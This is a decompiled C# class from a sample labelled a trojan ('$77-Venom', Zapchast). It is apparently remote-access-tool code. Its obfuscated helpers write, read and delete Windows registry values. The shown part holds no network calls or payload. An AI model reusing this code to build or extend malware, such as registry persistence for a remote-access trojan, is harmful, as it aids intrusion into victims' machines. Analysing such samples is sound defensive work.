// Decompiled with JetBrains decompiler
// Type: ℥举<ȋ푡흇钹봳聉髦踾ל�ꂊ╝꘾됈
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using xClient.Core.Registry;

public static class \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈
{
  private static string 對瘌錞뇸ꛫԨ雘䚆㥸喘︄\u2EC5ಘ湎\u2011褣鉉鯦롏壑 = string.Empty;

  public static bool \uEE5CԱ\uE1C7᪅㜲뙔㭗嘋聆ሟ㾄嘱쎖ǃㄨᾥꮟ骤ᚸ奊(
    RegistryHive hive,
    string path,
    string name,
    string value,
    bool addQuotes = false)
  {
    try
    {
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
      {
        if (registryKey == null)
          return false;
        if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
          value = "\"" + value + "\"";
        registryKey.SetValue(name, (object) value);
        return true;
      }
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public static RegistryKey 㟃ɏ\uF7A0䑐渖靦뎦믄죡ቜ㓽\uA7BF뽙舏幨踖쎹\u4DFE袖㺐(
    RegistryHive hive,
    string path)
  {
    try
    {
      return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, false);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static bool 䡹\u20C2쉖図䄧\u2627榸\u294Bㅔ忿\uE256\uE64Ehᩪꡐ姷\u0B11컽\u25C2\uA4CE(
    RegistryHive hive,
    string path,
    string name)
  {
    try
    {
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
      {
        if (registryKey == null)
          return false;
        registryKey.DeleteValue(name, true);
        return true;
      }
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public static bool 衛㼸羟퍁ᔶ\uF108籶쨌\u271C\u2669ᦨ\uEC54뗗䶯惺휨蚺\uE5DF\uE37B鵊(string valueName) => string.IsNullOrEmpty(valueName);

  public static RegValueData[] \uFFFD\u2852豙赖\uEB7F䫌ﯤ孜\u0887\uE043\uF895\u2381紤홁\uF833\uF6FCᇲ릚礼\u2E5D(
    List<RegValueData> values)
  {
    if (!values.Any<RegValueData>((Func<RegValueData, bool>) (value => \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.衛㼸羟퍁ᔶ\uF108籶쨌\u271C\u2669ᦨ\uEC54뗗䶯惺휨蚺\uE5DF\uE37B鵊(value.Name))))
      values.Add(\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.ꄿ\uF167缃\uA495䲒潠\uE471쩒ﲢ魘ら\uE3DFꭋ臞䆗쎟폹윷乂P());
    return values.ToArray();
  }

  public static RegValueData[] \u2F2E脚妑\uE757贈ἤ̖쮀蔉騱뀖游ﱴ锥\uF7D7뵙篦筷쌬䌱() => new RegValueData[1]
  {
    \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.ꄿ\uF167缃\uA495䲒潠\uE471쩒ﲢ魘ら\uE3DFꭋ臞䆗쎟폹윷乂P()
  };

  private static RegValueData ꄿ\uF167缃\uA495䲒潠\uE471쩒ﲢ魘ら\uE3DFꭋ臞䆗쎟폹윷乂P() => new RegValueData(\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.對瘌錞뇸ꛫԨ雘䚆㥸喘︄\u2EC5ಘ湎\u2011褣鉉鯦롏壑, RegistryValueKind.String, (object) null);
}
